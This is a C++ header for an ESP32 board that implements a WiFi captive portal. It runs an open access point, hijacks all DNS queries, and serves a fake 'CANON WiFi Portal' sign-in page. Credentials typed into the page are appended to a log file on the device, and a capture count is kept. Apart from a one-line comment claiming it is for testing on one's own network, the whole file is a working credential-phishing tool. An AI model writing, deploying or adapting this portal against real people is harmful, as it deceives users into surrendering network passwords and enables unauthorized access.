#pragma once
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include "theme.h"

// A simple WiFi captive portal: starts a SoftAP, redirects all DNS queries
// to itself, and serves a light-blue "WiFi login" page. Submitted form
// data is appended to /portal_log.txt on SPIFFS for review on-device.
//
// Intended for testing on your own devices/network.
class CaptivePortal {
public:
    void begin(const char* apName) {
        WiFi.mode(WIFI_AP);
        WiFi.softAP(apName);
        ip = WiFi.softAPIP();
        dns.start(DNS_PORT, "*", ip);

        server.on("/", HTTP_GET, [this]() { handleRoot(); });
        server.on("/save", HTTP_POST, [this]() { handleSave(); });
        server.onNotFound([this]() { handleRoot(); });
        server.begin();
        running = true;
    }

    void end() {
        if (!running) return;
        server.stop();
        dns.stop();
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_OFF);
        running = false;
    }

    void handle() {
        if (!running) return;
        dns.processNextRequest();
        server.handleClient();
    }

    bool isRunning() const { return running; }
    IPAddress getIP() const { return ip; }
    int getCaptureCount() const { return captureCount; }

private:
    static const uint8_t DNS_PORT = 53;

    void handleRoot() {
        const char* html = R"HTML(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi Connect</title>
<style>
body{background:#ADD8E6;font-family:monospace;color:#000020;text-align:center;padding-top:60px;}
.box{background:#DFFFFF;border:4px solid #2A6F97;display:inline-block;padding:24px 32px;}
input{display:block;width:200px;margin:10px auto;padding:8px;border:2px solid #2A6F97;font-family:monospace;}
button{background:#2A6F97;color:#fff;border:none;padding:10px 24px;font-family:monospace;font-size:1em;}
</style></head><body>
<div class="box">
<h2>CANON WiFi Portal</h2>
<p>Sign in to access the network</p>
<form action="/save" method="POST">
<input name="network" placeholder="WiFi Network" autocomplete="off">
<input name="password" type="password" placeholder="Password" autocomplete="off">
<button type="submit">Connect</button>
</form>
</div>
</body></html>
)HTML";
        server.send(200, "text/html", html);
    }

    void handleSave() {
        String network = server.arg("network");
        String password = server.arg("password");

        File f = SPIFFS.open("/portal_log.txt", FILE_APPEND);
        if (f) {
            f.printf("network=%s password=%s\n", network.c_str(), password.c_str());
            f.close();
            captureCount++;
        }

        const char* html = R"HTML(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{background:#ADD8E6;font-family:monospace;color:#000020;text-align:center;padding-top:80px;}</style>
</head><body><h2>Connecting...</h2><p>Please wait.</p></body></html>
)HTML";
        server.send(200, "text/html", html);
    }

    WebServer server{80};
    DNSServer dns;
    IPAddress ip;
    bool running = false;
    int captureCount = 0;
};
